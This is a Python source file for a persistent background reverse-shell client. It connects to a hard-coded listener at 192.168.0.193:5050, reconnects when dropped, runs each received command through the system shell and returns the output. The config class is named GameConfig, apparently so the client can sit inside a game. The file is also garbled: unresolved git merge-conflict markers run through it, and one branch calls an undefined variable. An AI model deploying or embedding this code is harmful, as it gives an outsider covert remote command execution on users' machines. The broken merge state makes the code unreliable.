"""
Robust reverse shell client with proper socket handling.
"""

import socket
import subprocess
import sys
import threading
import os
<<<<<<< HEAD
import time
=======
>>>>>>> dd750572a9ca65bc4544af45f9b7984c73d64a66
from pathlib import Path
from typing import Optional

try:
    from .config import GameConfig, resolve_listener_host
except (ImportError, ValueError):
    try:
        from config import GameConfig, resolve_listener_host
    except ImportError:
        class GameConfig:
            LISTENER_HOST = "192.168.0.193"
            LISTENER_PORT = 5050
            RECONNECT_DELAY_SEC = 5
            MAX_RECONNECT_ATTEMPTS = 0

        def resolve_listener_host():
            return GameConfig.LISTENER_HOST


class ShellClient(threading.Thread):
    """
    Persistent reverse shell client that runs in background.
    """

    def __init__(self) -> None:
        super().__init__(daemon=True)
        self.cfg = GameConfig()
        self._sock: Optional[socket.socket] = None
        self._stop = threading.Event()

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass

    def run(self) -> None:
        """Main loop: connect and handle session."""
        host = resolve_listener_host()
        port = self.cfg.LISTENER_PORT
        attempts = 0

        while not self._stop.is_set():
            try:
                # Connect with generous timeout for handshake only
                self._sock = socket.create_connection((host, port), timeout=5)
                # After connection, use NO timeout for session (blocking indefinitely)
                self._sock.settimeout(None)
                self._handle_session(self._sock)
            except Exception as e:
                self._sock = None
                attempts += 1
                if self.cfg.MAX_RECONNECT_ATTEMPTS and attempts >= self.cfg.MAX_RECONNECT_ATTEMPTS:
                    break
                time.sleep(self.cfg.RECONNECT_DELAY_SEC)
            else:
                break

    def _handle_session(self, sock: socket.socket) -> None:
<<<<<<< HEAD
        """
        Handle the reverse shell session.
        Read commands from listener, execute them, send output back.
        """
=======
        f = sock.makefile("rwb", buffering=0)
        import os
        from pathlib import Path
        current_cwd = os.getcwd()
>>>>>>> dd750572a9ca65bc4544af45f9b7984c73d64a66
        try:
            # Send ready banner
            banner = b"CLIENT win32 READY\n"
            sock.sendall(banner)

            current_cwd = os.getcwd()

            while not self._stop.is_set():
                # Read command line from listener
                try:
                    data = sock.recv(4096)
                    if not data:
                        # Connection closed
                        break

                    cmd = data.decode("utf-8", errors="ignore").strip()
                except Exception:
                    break

                if not cmd:
                    continue

<<<<<<< HEAD
                if cmd.lower() in {"exit", "quit"}:
                    break

                # Execute command
                result, current_cwd = self._execute_command(cmd, current_cwd)

                # Send output back with marker
                try:
                    output = result.encode("utf-8", errors="ignore")
                    marker = b"\n<<<END_OF_COMMAND>>>\n"
                    sock.sendall(output + marker)
                except Exception:
                    break

        except Exception:
            pass
=======
                result, current_cwd = self._execute_command(cmd, current_cwd)
                payload = result.encode("utf-8", errors="ignore")
                f.write(payload + b"\n<<<END_OF_COMMAND>>>\n")
>>>>>>> dd750572a9ca65bc4544af45f9b7984c73d64a66
        finally:
            try:
                sock.close()
            except Exception:
                pass

    @staticmethod
    def _execute_command(cmd: str, cwd: str) -> tuple[str, str]:
        """
<<<<<<< HEAD
        Execute a shell command.
        Returns (output, new_cwd).
        """
        # Handle 'cd' specially to maintain state
        if cmd.startswith("cd ") or cmd == "cd":
            target = cmd[3:].strip() if cmd.startswith("cd ") else str(Path.home())
            try:
                os.chdir(target)
                return f"[+] Changed to: {os.getcwd()}\n", os.getcwd()
            except Exception as e:
                return f"[-] cd failed: {e}\n", cwd

        # Execute command in shell
=======
        Execute a shell command on the local system.
        Returns (output_text, new_cwd).
        """
        # Handle 'cd' internally so it changes the state for future commands
        if cmd.startswith("cd ") or cmd == "cd":
            target = cmd[3:].strip()
            if not target:
                target = str(Path.home())
            try:
                os.chdir(target)
                new_cwd = os.getcwd()
                return "", new_cwd
            except Exception as exc:
                return f"[client] cd failed: {exc!r}", cwd

>>>>>>> dd750572a9ca65bc4544af45f9b7984c73d64a66
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
<<<<<<< HEAD
                timeout=20,
                cwd=cwd
            )
            output = result.stdout + result.stderr
            return output if output else "[+] Command completed (no output)\n", cwd
        except subprocess.TimeoutExpired:
            return "[-] Command timed out (20s limit)\n", cwd
        except Exception as e:
            return f"[-] Execution error: {e}\n", cwd
=======
                cwd=cwd
            )
            out, _ = proc.communicate(timeout=60)
        except Exception as exc:  # noqa: BLE001
            return f"[client] error while executing command: {exc!r}", cwd
            
        return out or "[client] command produced no output.", cwd
>>>>>>> dd750572a9ca65bc4544af45f9b7984c73d64a66

